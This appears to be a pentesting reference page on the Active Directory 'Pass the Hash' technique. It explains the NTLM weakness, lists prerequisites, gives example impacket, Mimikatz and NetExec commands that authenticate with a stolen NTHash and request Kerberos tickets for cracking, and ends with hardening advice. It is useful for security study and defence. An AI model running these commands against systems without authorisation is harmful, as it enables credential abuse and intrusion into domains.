---
layout: default
title: Pass the Hash
parent: Active Directory
nav_order: 1
permalink: /ad/passthehash/
---

# Pass the Hash
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

If you manage to get the NTHash of a domain user - *by [extracting credentials](/windows/credentials/) for instance* - and NTLM (New Technology Lan Manager) authentication is enabled, you could authenticate through the domain with this hash. NTLM succeed to LM (Lan Manager) which is by default disabled from Windows Vista and Windows Server 2008.

{: .important }
> Even if LM is disabled by default nowadays, you can still find LMHash on Windows password storage since it uses `LMHash:NTHash` format.

Having the LMHash or the NTHash - *or both in most cases* - you can also try to [crack](/cracking/) them.

## Prerequisites

* Having the NTHash of a domain user.
* NTLM authentication is enabled on the domain.

## Exploit

Authentication with Pass the Hash method can be performed with many - *all?* - tools you will see on this blog and elsewhere. Depeding on the tool:
* Use `-H`, `-hashes`, `-pw-nt-hash`, `/ntlm`, etc. option.
* Put `:` before the NTHash like `:31d6cfe0d16ae931b73c59d7e0c089c0`.

Here are some examples.

```bash
# With impacket.
impacket-GetUserSPNs $Domain/$Username -hashes ":$NTHash" -dc-ip $dc_ip -request -outputfile kerberoast.out

# With Mimikatz.
sekurlsa::pth /user:$Username /domain:$Domain /ntlm:$NTHash

# With NetExec.
nxc smb $DomainControllerIP -u $Username -H $NTHash
```

Well, [RTFM](https://en.wikipedia.org/wiki/RTFM).

## Useful links

* Differences between NTLM, Net-NTLMv1 and Net-NTLMv2 in [Péter Gombos' article](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

## Recommendations

- [ ] The best - *but very hard to apply* - recommendation is to completely disable NTLM within the domain to enforce Kerberos authentication.
- [ ] Otherwise, check recommendations to [avoid credentials extraction](/windows/credentials/#recommendations).